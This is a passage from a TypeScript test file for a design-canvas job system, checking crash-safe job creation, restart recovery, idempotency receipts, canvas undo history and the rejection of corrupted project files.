    assert.ok(fresh.threadTurnReservation);
    assert.equal(fresh.mainThreadReservation, null);
    assert.deepEqual(
      fresh.threadTurnReservation!.thread.messages.map((message) => message.id),
      [
        fresh.threadTurnReservation!.requestMessageId,
        fresh.threadTurnReservation!.assistantMessageId,
      ],
    );

    const reused = await createDesignJob(dataDir, projectId, input, 101);
    assert.equal(reused.reused, true);
    assert.equal(reused.job.id, fresh.job.id);
    assert.equal(reused.threadTurnReservation, null);
    assert.equal(reused.mainThreadReservation, null);
    assert.equal((await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" })).messages.length, 2);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart reconciliation makes every Job creation phase exactly-once", async (t) => {
  const phases: readonly DesignJobCreationPhase[] = [
    "marker", "context", "job", "thread", "project", "committed", "delete",
  ];
  for (const phase of phases) {
    await t.test(phase, async () => {
      const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-job-creation-${phase}-`));
      const projectId = `project-job-creation-${phase}`;
      const input = {
        kind: "node-generation" as const,
        ...FIXTURE_JOB_IDENTITY,
        nodeId: "node-page",
        idempotencyKey: `create-once-${phase}`,
        promptHash: "d".repeat(64),
        reserveThreadTurn: {
          requestContent: "Generate exactly once across restart",
          assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
        },
      };
      try {
        await initializeDesignProject(dataDir, projectId);
        await mutateDesignCanvas(dataDir, projectId, {
          expectedRevision: 0,
          intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
        });
        await assert.rejects(
          Reflect.apply(createDesignJob, undefined, [dataDir, projectId, input, 100, {
            simulateProcessCrash: true,
            afterPhase: (completed: DesignJobCreationPhase) => {
              if (completed === phase) throw new Error(`simulated Job creation exit after ${phase}`);
            },
          }]),
          new RegExp(`exit after ${phase}`),
        );

        // Every public Project barrier reconciles creation WAL before exposing authority.
        await getDesignCanvas(dataDir, projectId);
        const retried = await createDesignJob(dataDir, projectId, input, 300);
        const jobs = await listDesignJobs(dataDir, projectId);
        const thread = await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" });
        const designRoot = join(dataDir, "projects", projectId, "design");
        const jobEntries = await readdir(join(designRoot, "jobs"));
        const transactionEntries = await readdir(join(designRoot, "transactions", "job-creations"));

        assert.equal(retried.reused, phase === "committed" || phase === "delete");
        assert.equal(jobs.length, 1);
        assert.equal(jobs[0]?.id, retried.job.id);
        assert.equal(thread.messages.length, 2);
        assert.deepEqual(thread.messages.map((message) => message.jobId), [retried.job.id, retried.job.id]);
        assert.equal(jobEntries.filter((entry) => entry.endsWith(".context.json")).length, 1);
        assert.deepEqual(transactionEntries, []);

        const interrupted = await recoverInterruptedDesignJobs(dataDir, projectId, 400);
        assert.equal(interrupted.length, 1);
        assert.equal(interrupted[0]?.id, retried.job.id);
        const terminalReplay = await createDesignJob(dataDir, projectId, {
          ...input,
          terminalReceiptPolicy: "reuse",
        }, 500);
        assert.equal(terminalReplay.reused, true);
        assert.equal(terminalReplay.job.id, retried.job.id);
        assert.equal((await listDesignJobs(dataDir, projectId)).length, 1);
        const recoveredThread = await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" });
        assert.equal(recoveredThread.messages.length, 2);
        assert.notEqual(recoveredThread.messages[1]?.content, DESIGN_MAIN_AGENT_QUEUED_MESSAGE);
      } finally {
        await rm(dataDir, { recursive: true, force: true });
      }
    });
  }
});

test("Job creation recovery fails closed when a pending thread reaches a third state", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-job-creation-third-state-"));
  const projectId = "project-job-creation-third-state";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    await assert.rejects(
      Reflect.apply(createDesignJob, undefined, [dataDir, projectId, {
        kind: "node-generation",
        ...FIXTURE_JOB_IDENTITY,
        nodeId: "node-page",
        idempotencyKey: "third-state",
        promptHash: "e".repeat(64),
        reserveThreadTurn: {
          requestContent: "Generate once",
          assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
        },
      }, 100, {
        simulateProcessCrash: true,
        afterPhase: (phase: DesignJobCreationPhase) => {
          if (phase === "thread") throw new Error("simulated process exit");
        },
      }]),
      /simulated process exit/,
    );
    const designRoot = join(dataDir, "projects", projectId, "design");
    const threadPath = join(designRoot, "nodes", "node-page", "agent", "thread.json");
    const thread = JSON.parse(await readFile(threadPath, "utf8"));
    thread.messages[1].content = "A different but valid assistant state";
    await writeFile(threadPath, `${JSON.stringify(thread, null, 2)}\n`, "utf8");

    await assert.rejects(getDesignCanvas(dataDir, projectId), /thread is in a third state/i);
    assert.equal((await readdir(join(designRoot, "transactions", "job-creations"))).length, 1);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery replaces reserved Node and Export assistant markers in place", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-thread-recovery-all-jobs-"));
  const projectId = "project-thread-recovery-all-jobs";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const nodeJob = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
      reserveThreadTurn: {
        requestContent: "Generate this page",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 100);
    const exportJob = await createDesignJob(dataDir, projectId, {
      kind: "implementation-export",
      ...FIXTURE_JOB_IDENTITY,
      exportId: "export-recovery",
      reserveThreadTurn: {
        requestContent: "Implementation export export-recovery started from exact Canvas revision 2.",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 101);

    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 200);

    assert.deepEqual(
      recovered.map((job) => job.id).sort(),
      [nodeJob.job.id, exportJob.job.id].sort(),
    );
    const nodeThread = await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" });
    const mainThread = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(nodeThread.messages.length, 2);
    assert.equal(mainThread.messages.length, 2);
    assert.match(nodeThread.messages[1]?.content ?? "", /Generation was interrupted by daemon restart and cancelled/i);
    assert.match(mainThread.messages[1]?.content ?? "", /export-recovery.*interrupted by daemon restart and cancelled/i);
    assert.notEqual(nodeThread.messages[1]?.content, DESIGN_MAIN_AGENT_QUEUED_MESSAGE);
    assert.notEqual(mainThread.messages[1]?.content, DESIGN_MAIN_AGENT_QUEUED_MESSAGE);
    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery projects terminal Main Jobs whose placeholder write was interrupted", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-terminal-thread-recovery-"));
  const projectId = "project-main-terminal-thread-recovery";
  try {
    await initializeDesignProject(dataDir, projectId);
    const failed = await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      reserveMainThreadTurn: {
        userContent: "Fail after the terminal Job write",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 100);
    assert.ok(failed.mainThreadReservation);
    await updateDesignJob(dataDir, projectId, failed.job.id, { status: "running" }, 101);
    await updateDesignThreadMessage(dataDir, projectId, { type: "main" }, failed.mainThreadReservation!.assistantMessageId, {
      content: "A success-looking reply persisted before the failure.",
      expectedRole: "assistant",
      expectedJobId: failed.job.id,
    }, 102);
    await updateDesignJob(dataDir, projectId, failed.job.id, {
      status: "failed",
      error: "terminal Job persisted before its thread projection",
    }, 103);
    const cancelled = await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      reserveMainThreadTurn: {
        userContent: "Cancel after the terminal Job write",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 104);
    assert.ok(cancelled.mainThreadReservation);
    await updateDesignThreadMessage(
      dataDir,
      projectId,
      { type: "main" },
      cancelled.mainThreadReservation!.assistantMessageId,
      {
        content: "A progress reply persisted before cancellation.",
        expectedRole: "assistant",
        expectedJobId: cancelled.job.id,
      },
      105,
    );
    await updateDesignJob(dataDir, projectId, cancelled.job.id, {
      status: "cancelled",
      error: "Main Agent turn cancelled",
    }, 106);
    const before = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(before.messages.filter((message) => message.content === DESIGN_MAIN_AGENT_QUEUED_MESSAGE).length, 0);

    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 200), []);
    const after = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(after.messages.length, before.messages.length);
    assert.match(
      after.messages.find((message) => message.role === "assistant" && message.jobId === failed.job.id)?.content ?? "",
      /Main Agent failed: terminal Job persisted before its thread projection/i,
    );
    assert.equal(
      after.messages.find((message) => message.role === "assistant" && message.jobId === cancelled.job.id)?.content,
      "Main Agent orchestration cancelled.",
    );
    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), after);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery replaces a Main success reply written before its terminal Job transition", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-reply-before-job-"));
  const projectId = "project-main-reply-before-job";
  try {
    await initializeDesignProject(dataDir, projectId);
    const created = await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      reserveMainThreadTurn: {
        userContent: "Complete, then crash before terminalizing the Job",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 100);
    assert.ok(created.mainThreadReservation);
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" }, 101);
    await updateDesignThreadMessage(
      dataDir,
      projectId,
      { type: "main" },
      created.mainThreadReservation!.assistantMessageId,
      {
        content: "Everything completed successfully.",
        expectedRole: "assistant",
        expectedJobId: created.job.id,
      },
      102,
    );

    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 200);
    assert.equal(recovered.find((job) => job.id === created.job.id)?.status, "cancelled");
    const thread = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(thread.messages.length, 2);
    assert.match(thread.messages[1]?.content ?? "", /interrupted by daemon restart and cancelled/i);
    assert.equal((await getDesignJob(dataDir, projectId, created.job.id)).status, "cancelled");
    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), thread);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery re-projects terminal Jobs whose Canvas ownership write was interrupted", async () => {
  const cases = [
    { status: "failed", kind: "node-generation", nodeKind: "page", error: "simulated terminal failure" },
    { status: "cancelled", kind: "node-generation", nodeKind: "page", error: "Agent turn cancelled" },
    { status: "ready", kind: "node-analysis", nodeKind: "image", error: null },
  ] as const;
  for (const [index, scenario] of cases.entries()) {
    const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-terminal-projection-${scenario.status}-`));
    const projectId = `project-terminal-projection-${scenario.status}`;
    try {
      await initializeDesignProject(dataDir, projectId);
      await mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: 0,
        intents: [{ type: "add-node", node: { id: "node-target", kind: scenario.nodeKind } }],
      });
      const created = await createDesignJob(dataDir, projectId, {
        kind: scenario.kind,
        ...FIXTURE_JOB_IDENTITY,
        nodeId: "node-target",
      }, 100 + index);
      const jobPath = join(dataDir, "projects", projectId, "design", "jobs", `${created.job.id}.json`);
      const terminalJob = JSON.parse(await readFile(jobPath, "utf8"));
      terminalJob.status = scenario.status;
      terminalJob.error = scenario.error;
      terminalJob.cancelRequested = scenario.status === "cancelled";
      terminalJob.updatedAt = 200 + index;
      terminalJob.finishedAt = 200 + index;
      await writeFile(jobPath, `${JSON.stringify(terminalJob, null, 2)}\n`);

      const stranded = await getDesignCanvas(dataDir, projectId);
      assert.equal(stranded.nodes[0]?.activeJobId, created.job.id);
      assert.equal(stranded.nodes[0]?.state, "queued");

      const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 300 + index);
      assert.equal(recovered.find((job) => job.id === created.job.id)?.status, scenario.status);
      const repaired = await getDesignCanvas(dataDir, projectId);
      assert.equal(repaired.nodes[0]?.activeJobId, null);
      assert.equal(repaired.nodes[0]?.state, scenario.status);
      assert.equal(repaired.nodes[0]?.error, scenario.status === "failed" ? scenario.error : null);

      const next = await createDesignJob(dataDir, projectId, {
        kind: scenario.kind,
        ...FIXTURE_JOB_IDENTITY,
        nodeId: "node-target",
      }, 400 + index);
      assert.notEqual(next.job.id, created.job.id);
      await cancelDesignJob(dataDir, projectId, next.job.id, 500 + index);
      assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 600 + index), []);
    } finally {
      await rm(dataDir, { recursive: true, force: true });
    }
  }
});

test("an exhausted idempotency receipt budget rejects before creating orphan Job files", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-receipt-limit-"));
  const projectId = "project-receipt-limit";
  try {
    await initializeDesignProject(dataDir, projectId);
    const designDir = join(dataDir, "projects", projectId, "design");
    const projectPath = join(designDir, "project.json");
    const project = JSON.parse(await readFile(projectPath, "utf8"));
    project.turnReceipts = Object.fromEntries(Array.from({ length: 5_000 }, (_, index) => [
      `main-agent:main:receipt-${index}`,
      { jobId: `job-${String(index).padStart(36, "0")}`, kind: "main-agent", nodeId: null, createdAt: index },
    ]));
    await writeFile(projectPath, `${JSON.stringify(project)}\n`);

    await assert.rejects(createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      idempotencyKey: "one-too-many",
      promptHash: "a".repeat(64),
    }), /receipt limit/i);
    assert.deepEqual(await readdir(join(designDir, "jobs")), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("idempotency receipts bind the normalized request and atomically replace failed attempts", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-receipt-identity-"));
  const projectId = "project-receipt-identity";
  const base = {
    kind: "main-agent" as const,
    runnerId: "claude",
    model: "sonnet",
    idempotencyKey: "quick-start-one",
    promptHash: "a".repeat(64),
    contextNodeIds: [] as string[],
  };
  try {
    await initializeDesignProject(dataDir, projectId);
    const first = await createDesignJob(dataDir, projectId, base, 100);
    assert.equal(first.reused, false);
    const activeDuplicate = await createDesignJob(dataDir, projectId, base, 101);
    assert.equal(activeDuplicate.reused, true);
    assert.equal(activeDuplicate.job.id, first.job.id);

    await assert.rejects(createDesignJob(dataDir, projectId, {
      ...base,
      promptHash: "b".repeat(64),
    }, 102), /different Design Agent request/i);
    await assert.rejects(createDesignJob(dataDir, projectId, {
      ...base,
      model: "opus",
    }, 103), /different Design Agent request/i);

    await updateDesignJob(dataDir, projectId, first.job.id, { status: "failed", error: "provider failed" }, 104);
    const successor = await createDesignJob(dataDir, projectId, base, 105);
    assert.equal(successor.reused, false);
    assert.notEqual(successor.job.id, first.job.id);
    assert.equal(successor.job.status, "queued");
    const successorDuplicate = await createDesignJob(dataDir, projectId, base, 106);
    assert.equal(successorDuplicate.reused, true);
    assert.equal(successorDuplicate.job.id, successor.job.id);

    await updateDesignJob(dataDir, projectId, successor.job.id, { status: "cancelled", error: "cancelled" }, 107);
    const concurrent = await Promise.all([
      createDesignJob(dataDir, projectId, base, 108),
      createDesignJob(dataDir, projectId, base, 108),
    ]);
    assert.equal(new Set(concurrent.map((entry) => entry.job.id)).size, 1);
    assert.deepEqual(concurrent.map((entry) => entry.reused).sort(), [false, true]);

    const project = JSON.parse(await readFile(
      join(dataDir, "projects", projectId, "design", "project.json"),
      "utf8",
    ));
    const receipt = project.turnReceipts["main-agent:main:quick-start-one"];
    assert.equal(receipt.jobId, concurrent[0]!.job.id);
    assert.match(receipt.requestHash, /^[a-f0-9]{64}$/);
    assert.equal(receipt.authorityHash, concurrent[0]!.job.contextHash);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("terminal receipt reuse is concurrent exact replay while ordinary retries still create a successor", async () => {
  for (const [index, status] of (["failed", "cancelled"] as const).entries()) {
    const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-terminal-receipt-${status}-`));
    const projectId = `project-terminal-receipt-${status}`;
    const input = {
      kind: "main-agent" as const,
      ...FIXTURE_JOB_IDENTITY,
      idempotencyKey: `terminal-${status}`,
      promptHash: String(index + 1).repeat(64),
      terminalReceiptPolicy: "reuse" as const,
    };
    try {
      await initializeDesignProject(dataDir, projectId);
      const first = await createDesignJob(dataDir, projectId, input, 100);
      await updateDesignJob(dataDir, projectId, first.job.id, {
        status,
        ...(status === "failed" ? { error: "provider failed" } : {}),
      }, 101);
      const replayed = await Promise.all([
        createDesignJob(dataDir, projectId, input, 102),
        createDesignJob(dataDir, projectId, input, 102),
      ]);
      assert.deepEqual(replayed.map((entry) => entry.reused), [true, true]);
      assert.deepEqual(replayed.map((entry) => entry.job.id), [first.job.id, first.job.id]);
      assert.equal((await listDesignJobs(dataDir, projectId)).length, 1);

      const ordinary = await createDesignJob(dataDir, projectId, {
        ...input,
        terminalReceiptPolicy: undefined,
      }, 103);
      assert.equal(ordinary.reused, false);
      assert.notEqual(ordinary.job.id, first.job.id);
    } finally {
      await rm(dataDir, { recursive: true, force: true });
    }
  }
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-terminal-policy-invalid-"));
  try {
    await initializeDesignProject(dataDir, "project-terminal-policy-invalid");
    for (const terminalReceiptPolicy of ["reuse", "retry-restart-interrupted"] as const) {
      await assert.rejects(createDesignJob(dataDir, "project-terminal-policy-invalid", {
        kind: "main-agent",
        ...FIXTURE_JOB_IDENTITY,
        terminalReceiptPolicy,
      }), /requires an idempotencyKey/i);
    }
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("bootstrap receipt recovery retries only a daemon-restart orphan", async (t) => {
  const terminalCases = [
    { label: "ready", finish: async (dataDir: string, projectId: string, jobId: string) => {
      await updateDesignJob(dataDir, projectId, jobId, { status: "running" }, 101);
      await updateDesignJob(dataDir, projectId, jobId, { status: "ready" }, 102);
    } },
    { label: "provider-failed", finish: async (dataDir: string, projectId: string, jobId: string) => {
      await updateDesignJob(dataDir, projectId, jobId, {
        status: "failed",
        error: "authentication expired; login required",
      }, 101);
    } },
    { label: "user-cancelled", finish: async (dataDir: string, projectId: string, jobId: string) => {
      await cancelDesignJob(dataDir, projectId, jobId, 101);
    } },
  ] as const;

  for (const [index, fixture] of terminalCases.entries()) {
    await t.test(`${fixture.label} is exact replay`, async () => {
      const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-bootstrap-policy-${fixture.label}-`));
      const projectId = `project-bootstrap-policy-${fixture.label}`;
      const input = {
        kind: "main-agent" as const,
        ...FIXTURE_JOB_IDENTITY,
        idempotencyKey: `bootstrap-policy-${fixture.label}`,
        promptHash: String(index + 3).repeat(64),
        terminalReceiptPolicy: "retry-restart-interrupted" as const,
      };
      try {
        await initializeDesignProject(dataDir, projectId);
        const first = await createDesignJob(dataDir, projectId, input, 100);
        await fixture.finish(dataDir, projectId, first.job.id);
        const replay = await createDesignJob(dataDir, projectId, input, 103);
        assert.equal(replay.reused, true);
        assert.equal(replay.job.id, first.job.id);
        assert.equal((await listDesignJobs(dataDir, projectId)).length, 1);
      } finally {
        await rm(dataDir, { recursive: true, force: true });
      }
    });
  }

  await t.test("daemon-restart interruption creates one successor", async () => {
    const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-bootstrap-policy-interrupted-"));
    const projectId = "project-bootstrap-policy-interrupted";
    const input = {
      kind: "main-agent" as const,
      ...FIXTURE_JOB_IDENTITY,
      idempotencyKey: "bootstrap-policy-interrupted",
      promptHash: "6".repeat(64),
      terminalReceiptPolicy: "retry-restart-interrupted" as const,
    };
    try {
      await initializeDesignProject(dataDir, projectId);
      const first = await createDesignJob(dataDir, projectId, input, 100);
      const interrupted = await recoverInterruptedDesignJobs(dataDir, projectId, 101);
      assert.deepEqual(interrupted.map((job) => job.id), [first.job.id]);
      const concurrent = await Promise.all([
        createDesignJob(dataDir, projectId, input, 102),
        createDesignJob(dataDir, projectId, input, 102),
      ]);
      assert.equal(new Set(concurrent.map((entry) => entry.job.id)).size, 1);
      assert.notEqual(concurrent[0]!.job.id, first.job.id);
      assert.deepEqual(concurrent.map((entry) => entry.reused).sort(), [false, true]);
      assert.equal((await listDesignJobs(dataDir, projectId)).length, 2);
    } finally {
      await rm(dataDir, { recursive: true, force: true });
    }
  });
});

test("Job receipt lookup returns the terminal original without mutating or creating a successor", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-job-receipt-lookup-"));
  const projectId = "project-job-receipt-lookup";
  const idempotencyKey = "lookup-terminal-original";
  try {
    await initializeDesignProject(dataDir, projectId);
    const created = await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      idempotencyKey,
      promptHash: "9".repeat(64),
    }, 100);
    await updateDesignJob(dataDir, projectId, created.job.id, {
      status: "failed",
      error: "terminal lookup fixture",
    }, 101);
    const designRoot = join(dataDir, "projects", projectId, "design");
    const projectPath = join(designRoot, "project.json");
    const beforeProject = await readFile(projectPath, "utf8");
    const beforeJobs = await readdir(join(designRoot, "jobs"));
    const receipt = JSON.parse(beforeProject).turnReceipts[`main-agent:main:${idempotencyKey}`];

    const found = await getDesignJobByIdempotencyKey(dataDir, projectId, {
      kind: "main-agent",
      nodeId: null,
      idempotencyKey,
      requestHash: receipt.requestHash,
    });
    assert.equal(found?.job.id, created.job.id);
    assert.equal(found?.job.status, "failed");
    assert.equal(await readFile(projectPath, "utf8"), beforeProject);
    assert.deepEqual(await readdir(join(designRoot, "jobs")), beforeJobs);
    await assert.rejects(getDesignJobByIdempotencyKey(dataDir, projectId, {
      kind: "main-agent",
      nodeId: null,
      idempotencyKey,
      requestHash: "0".repeat(64),
    }), /different Design Agent request/i);
    assert.equal(await getDesignJobByIdempotencyKey(dataDir, projectId, {
      kind: "main-agent",
      nodeId: null,
      idempotencyKey: "missing",
      requestHash: receipt.requestHash,
    }), null);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery keeps a committed idempotent Main plan terminal-sticky", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-commit-recovery-"));
  const projectId = "project-main-commit-recovery";
  const request = {
    kind: "main-agent" as const,
    runnerId: "claude",
    model: "sonnet",
    idempotencyKey: "committed-main-plan",
    promptHash: "c".repeat(64),
  };
  try {
    await initializeDesignProject(dataDir, projectId);
    const created = await createDesignJob(dataDir, projectId, request, 100);
    assert.ok(created.receiptKey);
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" }, 101);
    const execution = await reserveDesignMainPlanExecution(dataDir, projectId, {
      jobId: created.job.id,
      receiptKey: created.receiptKey!,
      planPayload: JSON.stringify({
        reply: "Committed",
        canvasIntents: [{ type: "add-node", node: { id: "node-committed", kind: "page" } }],
        dispatches: [],
      }),
      planningAuthorityHash: "d".repeat(64),
      canvasRevision: 0,
    }, 102);
    const canvas = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-committed", kind: "page" } }],
      mainPlanApplication: {
        jobId: created.job.id,
        receiptKey: created.receiptKey!,
        planHash: execution.planHash,
      },
    }, 103);
    const rawProject = JSON.parse(await readFile(
      join(dataDir, "projects", projectId, "design", "project.json"),
      "utf8",
    ));
    assert.equal(rawProject.turnReceipts[created.receiptKey!].mainPlanAppliedRevision, canvas.revision);

    await recoverInterruptedDesignJobs(dataDir, projectId, 104);
    const retry = await createDesignJob(dataDir, projectId, {
      ...request,
      terminalReceiptPolicy: "retry-restart-interrupted",
    }, 105);
    assert.equal(retry.reused, true);
    assert.equal(retry.job.id, created.job.id);
    assert.equal(retry.job.status, "cancelled");
    assert.deepEqual((await getDesignCanvas(dataDir, projectId)).nodeOrder, ["node-committed"]);
    assert.equal((await listDesignJobs(dataDir, projectId)).filter((job) => job.kind === "main-agent").length, 1);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("retired Node identity exhaustion rejects atomically without corrupting the Project", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-retired-limit-"));
  const projectId = "project-retired-limit";
  try {
    await initializeDesignProject(dataDir, projectId);
    const projectPath = join(dataDir, "projects", projectId, "design", "project.json");
    const project = JSON.parse(await readFile(projectPath, "utf8"));
    project.retiredNodeIds = Array.from({ length: 5_000 }, (_, index) => `retired-${index}`);
    await writeFile(projectPath, `${JSON.stringify(project, null, 2)}\n`);

    const added = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-over-limit", kind: "page" } }],
    });
    const bytesBefore = await readFile(projectPath);
    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: added.revision,
      intents: [{ type: "remove-node", nodeId: "node-over-limit" }],
    }), /retired Node identity limit/i);
    assert.deepEqual(await readFile(projectPath), bytesBefore);
    const canvas = await getDesignCanvas(dataDir, projectId);
    assert.equal(canvas.revision, added.revision);
    assert.equal(canvas.nodes[0]?.id, "node-over-limit");

    await assert.rejects(
      undoDesignCanvas(dataDir, projectId, canvas.revision),
      /retired Node identity limit/i,
    );
    assert.deepEqual(await readFile(projectPath), bytesBefore);
    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.id, "node-over-limit");
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("large finite Node geometry persists and reaches Agent context", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-large-node-"));
  const projectId = "project-large-node";
  const geometry = { x: 0, y: 0, width: 12_000, height: 9_000 };
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-large", kind: "page" } }],
    });
    const canvas = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 1,
      intents: [{ type: "update-node", nodeId: "node-large", patch: { geometry } }],
    });
    assert.deepEqual(canvas.nodes[0]?.geometry, geometry);
    assert.deepEqual((await getDesignCanvas(dataDir, projectId)).nodes[0]?.geometry, geometry);

    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-large",
    });
    const context = await getDesignJobContext(dataDir, projectId, created.job.id);
    assert.deepEqual(context.nodes.find((node) => node.id === "node-large")?.geometry, geometry);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("project.json rejects identity and bounded Node-schema tampering", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-corrupt-project-"));
  const projectId = "project-corrupt";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const projectPath = join(dataDir, "projects", projectId, "design", "project.json");
    const original = JSON.parse(await readFile(projectPath, "utf8"));
    await writeFile(projectPath, `${JSON.stringify({ ...original, projectId: "another-project" })}\n`);
    await assert.rejects(getDesignCanvas(dataDir, projectId), /schema|identity|corrupt/i);

    const invalidNode = structuredClone(original);
    invalidNode.nodes[0].geometry.width = Number.POSITIVE_INFINITY;
    await writeFile(projectPath, `${JSON.stringify(invalidNode)}\n`);
    await assert.rejects(getDesignCanvas(dataDir, projectId), /invalid Node|corrupt/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("viewport-only saves do not consume undo history or clear redo", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-viewport-history-"));
  const projectId = "project-viewport-history";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 1,
      intents: [{ type: "update-node", nodeId: "node-page", patch: { geometry: { x: 300 } } }],
    });
    const undone = await undoDesignCanvas(dataDir, projectId, 2);
    assert.equal(undone.undoDepth, 1);
    assert.equal(undone.redoDepth, 1);
    const viewportSaved = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: undone.revision,
      intents: [{ type: "set-viewport", viewport: { x: 90, y: -45, zoom: 1.4 } }],
    });
    assert.equal(viewportSaved.undoDepth, 1);
    assert.equal(viewportSaved.redoDepth, 1);
    const redone = await redoDesignCanvas(dataDir, projectId, viewportSaved.revision);
    assert.deepEqual(redone.viewport, { x: 90, y: -45, zoom: 1.4 });
    assert.equal(redone.nodes[0]?.geometry.x, 300);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("frozen context rejects a payload set beyond the global byte budget", () => {
  assert.throws(() => assertDesignFrozenContextBudget({
    schemaVersion: 2,
    projectId: "project-budget",
    canvasRevision: 1,
    targetNodeId: null,
    viewport: { x: 0, y: 0, zoom: 1 },
    nodes: [{
      id: "node-large",
      kind: "file",
      name: "Large",
      state: "ready",
      geometry: { x: 0, y: 0, width: 320, height: 180 },
      selectedVersionId: null,
      selectedVersionContentKind: null,
      selectedVersionChecksum: null,
      selectedVersionBytes: null,
      selectedVersionPath: null,
      selectedVersionJobId: null,
      selectedVersionRunnerId: null,
